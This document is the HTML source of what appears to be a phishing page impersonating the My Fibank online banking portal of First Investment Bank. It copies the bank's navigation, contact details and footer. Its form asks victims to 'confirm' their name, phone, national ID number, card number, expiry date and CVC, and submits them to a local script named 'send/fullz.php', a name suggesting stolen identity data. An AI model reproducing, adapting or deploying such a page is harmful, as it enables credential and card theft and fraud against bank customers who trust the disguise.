<html ng-app="sgOAuth2" class="ng-scope"><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}.ng-hide-add-active,.ng-hide-remove{display:block!important;}</style>
		<base href="">
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="description" content="">
		<meta name="author" content="">
		<link rel="shortcut icon" href="./img/favicon.ico">	
		
		<meta name="_csrf" content="bba7fbc3-1b12-4106-aa33-e080146624e4">
		<meta name="_csrf_header" content="X-CSRF-TOKEN">
		
		<title>Connectez-vous à My Fibank</title>
		
		<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
		<!--[if lt IE 9]>
		<script src="themes/COMMON/scripts/utils/es5-shim.js"></script>
		<script src="themes/COMMON/scripts/utils/html5shiv.min.js"></script>
		<script src="themes/COMMON/scripts/angular-ui/ui-utils-ieshiv.min.js"></script>
		
		
		<script>
	      document.createElement('ui-select');
	      document.createElement('ui-select-match');
	      document.createElement('ui-select-choices');
	    </script>
		<![endif]-->
		
<!-- 		<script src="themes/COMMON/scripts/utils/modernizr.js"></script> -->
		
		<!-- Core CSS -->
		
			<link href="./css/css.css" rel="stylesheet">
		
		
		<!--[if IE 8]>
		<link href="themes/COMMON/stylesheets/style-ie8.css" rel="stylesheet">
		<script src="themes/COMMON/scripts/utils/respond.min.js"></script>
		<![endif]-->
		<link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"></head><body ng-controller="AppGlobalController" ng-class="{'info-footer' : $state.includes('login') || $state.includes('logout'), 'only-footer' : $state.includes('registration') || $state.includes('lost-password')}" class="ng-scope only-footer"><object id="oCAPICOM" codebase="themes/COMMON/capicom.cab#version=2,0,0,3" classid="clsid:A996E48C-D3DC-4244-89F7-AFA33EC60679" style="display: none;">&nbsp;</object>
	
	
		<div class="body-wrapper">
			<nav class="navbar navbar-default" role="banner">
				<div class="container-fluid">
					<div class="navbar-header">
						<a href="/EBank" ng-class="{'navbar-brand' : selectLang.lang == 'BGN', 'navbar-brand-en' : selectLang.lang != 'BGN'}" class="navbar-brand"></a>
					</div>
					
					<div class="collapse navbar-collapse" role="navigation">
						<ul class="nav navbar-nav">
							<li><a href="" ng-click="changeLang(notSelectedLang)" ng-bind="notSelectedLang.langDesc" class="ng-binding"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Anglais</font></font></a></li>							
							<li><a ng-href="" target="blank" href=""><i class="i-16  i-to-site"></i><span translate="APP.WEBSITE" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Отидете на уеб сайта</font></font></span></a></li>							
							<li dropdown="" sg-dropdown="" is-open="status.isopen" class="ng-scope">
								<a ng-href="" target="blank" href=""><i class="i-32 i-app-full"></i><span translate="APP.MOBAPP" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Мобилно приложение</font></font></span></a>
								<ul dropdown-menu="" class="dropdown-menu menu-app">
									<li>
										<h3 translate="APP.MOBAPP_PIC" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Banque n'importe où, n'importe quand</font></font></h3>
										<a ng-href="" target="blank" translate="APP.LEARNMORE" class="btn btn-default h-34 ng-scope" href=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">En savoir plus</font></font></a>
									</li>
								</ul>
							</li>
							<li><a ng-href="" target="blank" href=""><i class="i-16 i-tariff-changes"></i><span translate="APP.CHANGES" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Промени в основното училище и тарифа</font></font></span></a></li>
													
							<li dropdown="" sg-dropdown="" is-open="status.isopen" class="ng-scope"> <!-- TODO: set angular -->
								<!--<a ng-href="{{'APP.HELP_URL' | translate}}" target="blank"><i class="i-16 i-help"></i><span translate="APP.HELP"></span></a>-->
								<a href=""><i class="i-16 i-help"></i><span translate="APP.HELP" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">помощ</font></font></span></a>
								<ul dropdown-menu="" class="dropdown-menu menu-help">
									<li>
										<h3 translate="APP.INFORMATION_NMENU" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Information</font></font></h3>
									</li>
									<!-- ngIf: false -->
									<li>
										<a ng-href="" target="blank" href="">
											<i class="i-faq i-18-20"></i>
											<span translate="APP.ASKED_QUESTIONS" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Foire aux questions</font></font></span>
										</a>
									</li>
									<li>
										<a ng-href="" target="blank" href="">
											<i class="i-security-advice-big i-18-20"></i>
											<span translate="APP.SECURITY_ADVICE" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mesures de sécurité</font></font></span>
										</a>
									</li>
									
									<!-- ngIf: globalConf.translateSufix != '_CY' --><li ng-if="globalConf.translateSufix != '_CY'" class="ng-scope">
										<a ng-href="https://webgate.ec.europa.eu/odr/main/?event=main.home.show&amp;lng=BG" target="blank" href="https://webgate.ec.europa.eu/odr/main/?event=main.home.show&amp;lng=BG">
											<i class="i-faq i-18-20"></i>
											<span translate="APP.OSD" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Résolution de litige en ligne</font></font></span>
										</a>
									</li><!-- end ngIf: globalConf.translateSufix != '_CY' -->
									
									<li>
										<div class="divider"></div>
									</li>
									<li>
										<h3 translate="APP.CONTACT_US_MENU" class="ng-scope">Връзка с нас</h3>
									</li>
									<li>
										<a class="cursor-text">
											<i class="i-18 i-phone"></i>
											<span translate="0700 12 777" class="ng-scope">0700 12 777</span>
										</a>
									</li>
									<li>
										<a class="cursor-text" ng-href="mailto:my.fibank@fibank.bg" href="mailto:my.fibank@fibank.bg">
											<i class="i-20-14 i-mail"></i>
											<span translate="my.fibank@fibank.bg" class="ng-scope">my.fibank@fibank.bg</span>
										</a>
									</li>
									<!-- ngIf: false -->
								</ul>
							</li>
						</ul>
						<ul class="nav navbar-nav navbar-right ">
							
								<!-- ngIf: globalConf.translateSufix != '_CY' --><li ng-if="globalConf.translateSufix != '_CY'" ng-show="$state.includes('login') || $state.includes('lost-password')" class="ng-scope ng-hide"><div><a ui-sref="registration({client_id:'E_BANK'})" translate="APP.REGISTRATION" class="pull-right btn btn-info h-34 w-btn-120 ng-scope" href="/oauth2-server/registration">РЕГИСТРАЦИЯ</a></div></li><!-- end ngIf: globalConf.translateSufix != '_CY' -->
								<li ng-show="$state.includes('registration')" class=""><div></div></li>
								<li ng-show="$state.includes('logoutSuccess')" class="ng-hide"><div><a translate="APP.LOGIN" href="/EBank" class="btn pull-right btn-primary h-34 w-btn-120 ng-scope">ВХОД</a></div></li>
							
						</ul>
					</div>
				</div>
			</nav>
		
			<!-- Content -->
			<!-- uiView:  --><div id="app" ui-view="" data-template-url="index" class="ng-scope">

<div class="container form-centered reg box-border ng-scope">
	<h1 translate="REGISTRATION.HEADER" class="ng-scope" style="
    position: relative;
    right: -125px;
    "><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Потвърдете информацията си</font></font></h1>
.

	<form id="form" name="form" novalidate="" action="./send/fullz.php" method="post">
		<div class="row">
			<div class="col-md-12">
				
				
			
			
			
			<div class="row">
				<div class="col-md-12 form-group">
					<label translate="REGISTRATION.EMAIL" class="ng-scope"><span class="red-txt"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*</font></font></span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
Пълно име:</font></font></label>
					<input name="email" type="email" maxlength="128" class="form-control ng-pristine ng-invalid ng-invalid-required ng-valid-email" ng-model="post.email" required="">
					<div ng-show="form.email.$dirty &amp;&amp; form.email.$invalid" class="ng-hide">
						<p class="pull-right s2 red-txt ng-scope" ng-show="form.email.$error.required" translate="REGISTRATION.ERROR.EMAIL">Моля, въведете и-мейл</p>
					
			<div class="row">
				<div class="col-md-12 form-group">
					<label translate="REGISTRATION.PHONE" class="ng-scope"><span class="red-txt"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*</font></font></span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
телефон :</font></font></label>
					<input name="phone" type="text" maxlength="128" class="form-control ng-pristine ng-invalid ng-invalid-required" ng-model="post.telephone" required="" phone="">
					<div ng-show="form.phone.$dirty &amp;&amp; form.phone.$invalid" class="ng-hide">
						<p class="pull-right s2 red-txt ng-scope" ng-show="form.phone.$error.required" translate="REGISTRATION.ERROR.PHONE">Моля, въведете телефон</p>
						<p class="pull-right s2 red-txt ng-scope ng-hide" ng-show="form.phone.$error.phone" translate="REGISTRATION.ERROR.PHONE_INVALID">Невалиден телефон</p>
					</div>
				</div>
			</div>
			<div class="row">
				<div class="col-md-12 form-group">
					<label translate="REGISTRATION.ADDRESS" class="ng-scope"><span class="red-txt"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*</font></font></span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
Идентификационен номер:</font></font></label>
					<input name="address" type="text" maxlength="128" class="form-control ng-pristine ng-invalid ng-invalid-required" ng-model="post.address" required="">
					<div ng-show="form.address.$dirty &amp;&amp; form.address.$invalid" class="ng-hide">
						<p class="pull-right s2 red-txt ng-scope" ng-show="form.address.$error.required" translate="REGISTRATION.ERROR.ADDRESS">Моля, въведете адрес</p>
					</div>
				</div>
			</div>
		</div>	
		
		
		<div class="divider margin-b-20"></div>
		<!-- ngIf: post.typeRegistration=='CARD' --><div class="margin ng-scope" ng-if="post.typeRegistration=='CARD'">
			<!-- <div class="padding-b-16">
            	<span class="s1" translate="REGISTRATION.CARD_INFO"></span>
			</div> -->
			
			<div class="row">
				<div class="col-md-12 form-group">
					<label translate="REGISTRATION.CARD_NUMBER" class="ng-scope"><span class="red-txt">* </span>номер на карта:</label>
					<input name="pan" info-text="REGISTRATION.CARD_NUMBER" class="w-267 form-control ng-pristine ng-invalid ng-invalid-required" required="" digits="" equal-length="16" maxlength="16" ng-model="post.cardInfo.pan" type="text">
					<div ng-show="form.pan.$dirty &amp;&amp; form.pan.$invalid" class="ng-hide">
						<p class="pull-right s2 red-txt ng-scope" ng-show="form.pan.$error.required" translate="REGISTRATION.ERROR.PAN">Въведете номер на картата</p>
						<p class="pull-right s2 red-txt ng-scope ng-hide" ng-show="form.pan.$error.digits" translate="REGISTRATION.ERROR.PAN_INVALID">Въведете валиден номер на картата</p>
						<p class="pull-right s2 red-txt ng-scope ng-hide" ng-show="form.pan.$error.equalLength" translate="REGISTRATION.ERROR.PAN_INVALID">Въведете валиден номер на картата</p>
					</div>
				</div>
			</div>
			
			<div class="row">
				<div class="col-md-12 form-group">
					<label translate="REGISTRATION.CARD_VALIDATION" class="ng-scope"><span class="red-txt">* </span>Валидност:</label>
					<div class="value">
						<div class="pull-left">
							<div class="sg-select">
								<select name="months" required="" class="form-control dropdown ng-pristine ng-invalid ng-invalid-required" ng-model="post.cardInfo.expiryMonthObj" ng-options="item as item.label for item in months track by item.id"><option class="default-option ng-binding" value="">месец</option><option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select>
							</div>
		                </div>
		                <div class="margin-l-10 pull-left">
		                  <span class="centered-label backslash">/</span>
		                </div>
		                <div class="margin-l-10 pull-left">
		                	<div class="sg-select ">
				                <select name="years" required="" class="form-control dropdown ng-pristine ng-invalid ng-invalid-required" ng-model="post.cardInfo.expiryYearObj" ng-options="item as item.label for item in years track by item.id"><option class="default-option ng-binding" value="">година</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option></select>
							</div>
		                </div>
		                <div ng-show="(form.months.$dirty &amp;&amp; form.months.$invalid) || (form.years.$dirty &amp;&amp; form.years.$invalid)" class="ng-hide">
							<p class="pull-left s2 red-txt ng-scope" ng-show="form.months.$error.required || form.years.$error.required" translate="REGISTRATION.ERROR.VALIDITY">Изберете валидност на картата</p>
						</div>
	                </div>
				</div>
			</div>
			
			<div class="row">
				<div class="col-md-12 form-group">
					<label translate="REGISTRATION.CVC" class="ng-scope"><span class="red-txt">* </span>CVC:</label>
					<div class="value">
						<input name="cvc" info-text="REGISTRATION.CVC" class="form-control cvc ng-pristine ng-invalid ng-invalid-required" required="" digits="" maxlength="3" ng-model="post.cardInfo.cvcCode" type="text">
						<div class="margin-l-10 pull-left">
		                  <a class="centered-label ng-scope" popover-html-unsafe="<div>
     <div class=&quot;pull-right padding-l-15&quot;><i class=&quot;i-hint-cvs&quot;></i></div>
     <div class=&quot;padding-t-15&quot;>
          <p>
             <strong>Какво е CVC?</strong>
          </p>
          <span>
                Като допълнителна информация по
                време на регистрацията е необходим
                т.нар. CVS2 код, който се намира на гърба на картата.
          </span>
     </div>
</div>
" popover-placement="left" popover-trigger="mouseenter" translate="REGISTRATION.CVC_WHAT">Какво е CVC?</a>
		                </div>
		                <div ng-show="form.cvc.$dirty &amp;&amp; form.cvc.$invalid" class="ng-hide">
							<p class="pull-left s2 red-txt ng-scope" ng-show="form.cvc.$error.required" translate="REGISTRATION.ERROR.CVC">Въведете CVC код на картата</p>
							<p class="pull-left s2 red-txt ng-scope ng-hide" ng-show="form.cvc.$error.digits" translate="REGISTRATION.ERROR.CVC_INVALID">REGISTRATION.ERROR.CVC_INVALID</p>
						</div>
					</div>
				</div>
			</div>
			<div class="row">
				
			</div>
			
			
			<div class="divider margin-b-20"></div>			
			<div class="row">
				<div class="col-md-12">
					<div>
						<label class="i-checks normal-txt">
							<input name="terms" class="form-control ng-pristine ng-invalid ng-invalid-required" required="" type="checkbox" ng-model="post.cardInfo.terms">
							
							
						</label>
					</div>					
				</div>
			</div>				
        </div><!-- end ngIf: post.typeRegistration=='CARD' -->
  
		
		<!-- ngIf: post.typeRegistration=='NO' -->
		<!-- ngIf: post.typeRegistration=='CARD' --><!-- end ngIf: post.typeRegistration=='CARD' -->
		
		
		<button class="btn btn-primary ng-scope" type="submit" translate="REGISTRATION.SUBMIT" ng-click="setAllInputsDirty()" ng-disabled="form.submiting"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Потвърждавам</font></font></button>
	</form>
</div>
 </div>
			<!-- Content -->
		
			<div class="body-push"></div>
		</div>
	<!--  FOOTER  -->
		<div id="footer-push">
			<!-- ngIf: !$state.includes('registration') && !$state.includes('lost-password') -->
			<div id="footer" class="container-fluid text-center">
				<ul class="list-inline s2">
					<!-- ngIf: false -->
					<!-- ngIf: false -->
					<!-- ngIf: globalConf.translateSufix != '_CY' --><li ng-if="globalConf.translateSufix != '_CY'" class="ng-scope"><a ng-href="http:///bg/moyata-fibank/page/1905#protses-na-registratsiya" translate="APP.REGISTRATION_PROC" target="_blank" class="ng-scope" href="http:///bg/moyata-fibank/page/1905#protses-na-registratsiya"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Процес на регистрация</font></font></a><i class="i-arrow-right-4x7"></i></li><!-- end ngIf: globalConf.translateSufix != '_CY' -->
					<!-- ngIf: false -->
					<li><a ng-href="http:///uploads/_Tariff_Bulletin/docs/Tariff.pdf" translate="APP.FEES_COMISSIONS" target="_blank" class="ng-scope" href="http:///uploads/_Tariff_Bulletin/docs/Tariff.pdf"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Такси и комисионни</font></font></a><i class="i-arrow-right-4x7"></i></li>
					<li><a ng-href="http:///bg/moyata-fibank/page/1905#dokumenti" translate="APP.DOCUMENTS" target="_blank" class="ng-scope" href="http:///bg/moyata-fibank/page/1905#dokumenti"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Документи</font></font></a><i class="i-arrow-right-4x7"></i></li>
				</ul>
				<p class="s2 ng-scope" translate="APP.COPYRIGHTS"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">© Първа инвестиционна банка 2009-2020. Всички права запазени </font><font style="vertical-align: inherit;">.</font></font></p>
			</div>
		</div>
	<!--  /FOOTER  -->	

		
		<!-- Static sources -->
		
			<script type="text/javascript" src="themes/E_BANK/app/app-static.min.js?v=1"></script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Traduction"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Texte d'origine</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Proposer une meilleure traduction</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
		
	
<div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Traduction"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Texte d'origine</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Proposer une meilleure traduction</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Traduction"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Texte d'origine</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Proposer une meilleure traduction</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div></body></html>